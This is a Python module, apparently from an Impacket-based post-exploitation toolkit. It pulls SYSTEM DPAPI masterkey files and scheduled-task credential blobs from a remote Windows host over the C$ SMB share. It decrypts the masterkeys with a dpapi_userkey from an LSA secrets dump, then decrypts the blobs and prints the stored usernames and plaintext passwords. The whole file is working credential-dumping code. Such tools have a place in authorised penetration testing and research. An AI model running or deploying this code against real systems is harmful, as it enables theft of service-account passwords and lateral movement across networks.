"""
DPAPI Credential Decryption for Scheduled Tasks

Decrypts DPAPI credential blobs using SYSTEM masterkeys. Based on the dploot
implementation and Impacket's DPAPI classes.

Scheduled task credentials use SYSTEM DPAPI context, requiring:
1. dpapi_userkey (from LSA secrets dump)
2. SYSTEM masterkey files (from C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\)
3. SYSTEM credential files (from C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\)

Workflow:
1. Extract dpapi_userkey from LSA secrets
2. Download and decrypt SYSTEM masterkey files
3. Download credential blobs
4. Decrypt credentials with decrypted masterkeys
"""

import logging
import ntpath
from binascii import unhexlify
from typing import Dict, List, Optional

from impacket.dpapi import (
    CREDENTIAL_BLOB,
    DPAPI_BLOB,
    CredentialFile,
    MasterKey,
    MasterKeyFile,
)
from impacket.smbconnection import SMBConnection as ImpacketSMBConnection
from impacket.uuid import bin_to_string


class MasterkeyInfo:
    """Represents a decrypted DPAPI masterkey"""

    def __init__(self, guid: str, blob: bytes, sid: str = "S-1-5-18"):
        self.guid = guid.lower()
        self.blob = blob
        self.sid = sid
        self.key = None
        self._sha1 = None

    def decrypt(self, dpapi_userkey: bytes) -> bool:
        """Decrypt masterkey using SYSTEM dpapi_userkey"""
        try:
            mkf = MasterKeyFile(self.blob)
            data = self.blob[len(mkf):]

            if mkf["MasterKeyLen"] > 0:
                mk = MasterKey(data[:mkf["MasterKeyLen"]])

                # Try to decrypt with dpapi_userkey
                decrypted = mk.decrypt(dpapi_userkey)
                if decrypted:
                    self.key = decrypted
                    # Generate SHA1 hash for key
                    from hashlib import sha1
                    self._sha1 = sha1(self.key).hexdigest()
                    return True

            return False
        except Exception as e:
            logging.debug(f"Failed to decrypt masterkey {self.guid}: {e}")
            return False

    @property
    def sha1(self) -> Optional[str]:
        """Return SHA1 hash of decrypted key"""
        return self._sha1

    def __str__(self) -> str:
        return f"{{{self.guid}}}:{self.sha1}" if self.key else f"{{{self.guid}}}:ENCRYPTED"


class ScheduledTaskCredential:
    """Represents a decrypted scheduled task credential"""

    def __init__(self,
                 task_name: str,
                 blob_path: str,
                 username: Optional[str] = None,
                 password: Optional[str] = None,
                 target: Optional[str] = None):
        self.task_name = task_name
        self.blob_path = blob_path
        self.username = username
        self.password = password
        self.target = target

    def dump(self) -> None:
        """Print credential in detailed format"""
        print("\n[SCHEDULED TASK CREDENTIAL]")
        print(f"Task Name:     {self.task_name}")
        print(f"Target:        {self.target or 'N/A'}")
        if self.username:
            print(f"Username:      {self.username}")
        if self.password:
            print(f"Password:      {self.password}")
        print(f"Blob Path:     {self.blob_path}")

    def dump_quiet(self) -> None:
        """Print credential in quiet format"""
        cred_str = f"{self.username}:{self.password}" if self.username and self.password else "DECRYPTION_FAILED"
        print(f"[SCHED_TASK] {self.task_name} - {cred_str}")


class DPAPIDecryptor:
    """
    Decrypts DPAPI credential blobs from scheduled tasks using SYSTEM masterkeys
    """

    # SYSTEM profile paths
    SYSTEM_MASTERKEY_PATH = "Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User"
    SYSTEM_CREDENTIALS_PATH = "Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials"

    def __init__(self, smb_conn: ImpacketSMBConnection, dpapi_userkey: str):
        """
        Initialize DPAPI decryptor
        
        Args:
            smb_conn: Authenticated Impacket SMB connection
            dpapi_userkey: Hex-encoded SYSTEM dpapi_userkey from LSA dump
                          (e.g., "0x51e43225e5b43b25d3768a2ae7f99934cb35d3ea")
        """
        self.smb_conn = smb_conn

        # Parse dpapi_userkey
        if dpapi_userkey.startswith("0x"):
            dpapi_userkey = dpapi_userkey[2:]
        self.dpapi_userkey = unhexlify(dpapi_userkey)

        self.masterkeys: Dict[str, MasterkeyInfo] = {}
        logging.info(f"Initialized DPAPI decryptor with userkey: {dpapi_userkey[:16]}...")

    def triage_system_masterkeys(self) -> List[MasterkeyInfo]:
        """
        Download and decrypt all SYSTEM masterkey files
        
        Returns:
            List of decrypted MasterkeyInfo objects
        """
        logging.info("Triaging SYSTEM masterkeys...")
        decrypted_keys = []

        try:
            # List masterkey files in SYSTEM profile
            files = self.smb_conn.listPath("C$", self.SYSTEM_MASTERKEY_PATH + "\\*")

            for file_info in files:
                filename = file_info.get_longname()

                # Skip . and ..
                if filename in [".", ".."]:
                    continue

                # GUID format check (masterkey files are named with GUIDs)
                if self._is_guid(filename):
                    guid = filename.lower()
                    filepath = ntpath.join(self.SYSTEM_MASTERKEY_PATH, filename)

                    logging.debug(f"Found SYSTEM masterkey: {guid}")

                    # Download masterkey file
                    try:
                        mk_bytes = self._read_file("C$", filepath)

                        if mk_bytes:
                            mk_info = MasterkeyInfo(guid=guid, blob=mk_bytes)

                            # Decrypt with dpapi_userkey
                            if mk_info.decrypt(self.dpapi_userkey):
                                self.masterkeys[guid] = mk_info
                                decrypted_keys.append(mk_info)
                                logging.info(f"Decrypted masterkey: {mk_info}")
                            else:
                                logging.debug(f"Failed to decrypt masterkey {guid}")

                    except Exception as e:
                        logging.debug(f"Error processing masterkey {guid}: {e}")

        except Exception as e:
            logging.error(f"Failed to triage SYSTEM masterkeys: {e}")

        logging.info(f"Decrypted {len(decrypted_keys)} SYSTEM masterkeys")
        return decrypted_keys

    def _read_file(self, share: str, path: str) -> Optional[bytes]:
        """Read a file from SMB share using getFile"""
        try:
            import io
            buffer = io.BytesIO()
            self.smb_conn.getFile(share, path, buffer.write)
            return buffer.getvalue()
        except Exception as e:
            logging.debug(f"Failed to read file {share}\\{path}: {e}")
            return None

    def decrypt_credential_blob(self,
                                 blob_bytes: bytes,
                                 task_name: str,
                                 blob_path: str,
                                 target: Optional[str] = None) -> Optional[ScheduledTaskCredential]:
        """
        Decrypt a DPAPI credential blob
        
        Args:
            blob_bytes: Raw credential file bytes
            task_name: Name of the scheduled task
            blob_path: Path to the blob on target system
            target: Target host identifier
        
        Returns:
            ScheduledTaskCredential object with decrypted username/password, or None if failed
        """
        try:
            # Try parsing as CredentialFile first (standard Windows credential format)
            # CredentialFile wraps a DPAPI blob inside a structured format
            try:
                cred_file = CredentialFile(blob_bytes)
                dpapi_blob_bytes = cred_file["Data"]
                logging.debug("Parsed as CredentialFile format")
            except Exception as e:
                # If CredentialFile parsing fails, treat as raw DPAPI blob
                dpapi_blob_bytes = blob_bytes
                logging.debug(f"Not a CredentialFile, treating as raw DPAPI blob: {e}")

            # Parse DPAPI blob to get masterkey GUID
            dpapi_blob = DPAPI_BLOB(dpapi_blob_bytes)
            masterkey_guid = bin_to_string(dpapi_blob["GuidMasterKey"]).lower()

            logging.debug(f"Credential blob requires masterkey: {masterkey_guid}")

            # Find corresponding masterkey
            mk_info = self.masterkeys.get(masterkey_guid)
            if not mk_info:
                logging.warning(f"Masterkey {masterkey_guid} not found for blob {blob_path}")
                return ScheduledTaskCredential(
                    task_name=task_name,
                    blob_path=blob_path,
                    target=target
                )

            # Decrypt blob with masterkey
            decrypted = self._decrypt_blob(dpapi_blob_bytes, mk_info)
            if not decrypted:
                logging.warning(f"Failed to decrypt blob {blob_path}")
                return ScheduledTaskCredential(
                    task_name=task_name,
                    blob_path=blob_path,
                    target=target
                )

            # Parse decrypted credential
            cred_blob = CREDENTIAL_BLOB(decrypted)

            # Extract task name/GUID from Target field
            # Format: "Domain:batch=TaskScheduler:Task:{GUID}"
            target_str = None
            if cred_blob["Target"]:
                target_str = cred_blob["Target"].decode("utf-16-le", errors="ignore").rstrip("\x00")
                # Extract GUID from "Domain:batch=TaskScheduler:Task:{GUID}"
                if "Task:{" in target_str and "}" in target_str:
                    task_guid = target_str.split("Task:{")[1].split("}")[0]
                    # Use GUID as task name if no task_name provided
                    if not task_name:
                        task_name = f"Task:{{{task_guid}}}"

            # Extract username and password
            username = None
            password = None

            # Username field (not UserName!) contains domain\username in UTF-16LE
            if cred_blob["Username"]:
                username = cred_blob["Username"].decode("utf-16-le", errors="ignore").rstrip("\x00")

            # Password is stored in Unknown3 field (UTF-16LE encoded)
            if cred_blob["Unknown3"]:
                password = cred_blob["Unknown3"].decode("utf-16-le", errors="ignore").rstrip("\x00")

            logging.info(f"Successfully decrypted credential for task: {task_name}")

            return ScheduledTaskCredential(
                task_name=task_name,
                blob_path=blob_path,
                username=username,
                password=password,
                target=target_str or target
            )

        except Exception as e:
            logging.error(f"Error decrypting credential blob: {e}", exc_info=True)
            return ScheduledTaskCredential(
                task_name=task_name,
                blob_path=blob_path,
                target=target
            )

    def decrypt_scheduled_task_credentials(self,
                                           blob_info_list: List[Dict],
                                           target: Optional[str] = None) -> List[ScheduledTaskCredential]:
        """
        Decrypt all scheduled task credential blobs
        
        Args:
            blob_info_list: List of dicts with keys: 'task_name', 'blob_path', 'blob_bytes'
            target: Target host identifier
        
        Returns:
            List of ScheduledTaskCredential objects
        """
        credentials = []

        logging.info(f"Decrypting {len(blob_info_list)} credential blobs...")

        for blob_info in blob_info_list:
            task_name = blob_info.get("task_name", "UNKNOWN")
            blob_path = blob_info.get("blob_path", "UNKNOWN")
            blob_bytes = blob_info.get("blob_bytes")

            if not blob_bytes:
                logging.warning(f"No blob data for {task_name}")
                continue

            cred = self.decrypt_credential_blob(
                blob_bytes=blob_bytes,
                task_name=task_name,
                blob_path=blob_path,
                target=target
            )

            if cred:
                credentials.append(cred)

        logging.info(f"Successfully processed {len(credentials)} credentials")
        return credentials

    def _decrypt_blob(self, blob_bytes: bytes, masterkey: MasterkeyInfo) -> Optional[bytes]:
        """
        Low-level DPAPI blob decryption using masterkey
        
        Args:
            blob_bytes: Raw DPAPI blob bytes
            masterkey: Decrypted MasterkeyInfo object
        
        Returns:
            Decrypted bytes or None
        """
        from Cryptodome.Cipher import AES, DES3
        from Cryptodome.Hash import SHA1, SHA512
        from Cryptodome.Util.Padding import unpad

        try:
            blob = DPAPI_BLOB(blob_bytes)

            # Get algorithm info
            ALGORITHMS_DATA = {
                0x6603: (168, DES3, DES3.MODE_CBC, 8),  # CALG_3DES
                0x6611: (128, AES, AES.MODE_CBC, 16),   # CALG_AES_128
                0x660e: (128, AES, AES.MODE_CBC, 16),   # CALG_AES_128 (alt)
                0x660f: (192, AES, AES.MODE_CBC, 16),   # CALG_AES_192
                0x6610: (256, AES, AES.MODE_CBC, 16),   # CALG_AES_256
            }

            # Hash algorithms
            HASH_ALGOS = {
                0x8004: SHA1,    # CALG_SHA1
                0x800e: SHA512,  # CALG_SHA_512
            }

            hash_algo = HASH_ALGOS.get(blob["HashAlgo"], SHA1)

            # Derive session key
            key_hash = unhexlify(masterkey.sha1)
            session_key = self._compute_session_key(
                key_hash=key_hash,
                salt=blob["Salt"],
                hash_algo=hash_algo
            )

            # Derive encryption key from session key
            derived_key = blob.deriveKey(session_key)

            # Decrypt data
            crypto_info = ALGORITHMS_DATA.get(blob["CryptAlgo"])
            if not crypto_info:
                logging.error(f"Unsupported crypto algorithm: {blob['CryptAlgo']:#x}")
                return None

            key_len, cipher_algo, mode, block_size = crypto_info
            cipher = cipher_algo.new(derived_key[:key_len // 8], mode=mode, iv=b"\x00" * block_size)
            cleartext = cipher.decrypt(blob["Data"])

            # Remove padding
            try:
                cleartext = unpad(cleartext, block_size)
            except ValueError:
                # Padding may already be removed
                pass

            return cleartext

        except Exception as e:
            logging.debug(f"Blob decryption failed: {e}")
            return None

    def _compute_session_key(self, key_hash: bytes, salt: bytes, hash_algo) -> bytes:
        """Compute DPAPI session key from masterkey hash and salt"""
        from Cryptodome.Hash import HMAC as CryptoHMAC

        # Try both session key derivation methods
        for i in range(2):
            if i == 0:
                # Method 1: HMAC(key, salt)
                h = CryptoHMAC.new(key_hash, salt, hash_algo)
            else:
                # Method 2: HMAC(salt, key)
                h = CryptoHMAC.new(salt, key_hash, hash_algo)

            hmac_result = h.digest()

            # Return first attempt (most common)
            if i == 0:
                return hmac_result

        return hmac_result

    @staticmethod
    def _is_guid(filename: str) -> bool:
        """Check if filename matches GUID pattern"""
        if len(filename) != 36:
            return False

        # GUID format: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
        parts = filename.split("-")
        if len(parts) != 5:
            return False

        if len(parts[0]) != 8 or len(parts[1]) != 4 or len(parts[2]) != 4 or \
           len(parts[3]) != 4 or len(parts[4]) != 12:
            return False

        # Check if all parts are hex
        try:
            for part in parts:
                int(part, 16)
            return True
        except ValueError:
            return False
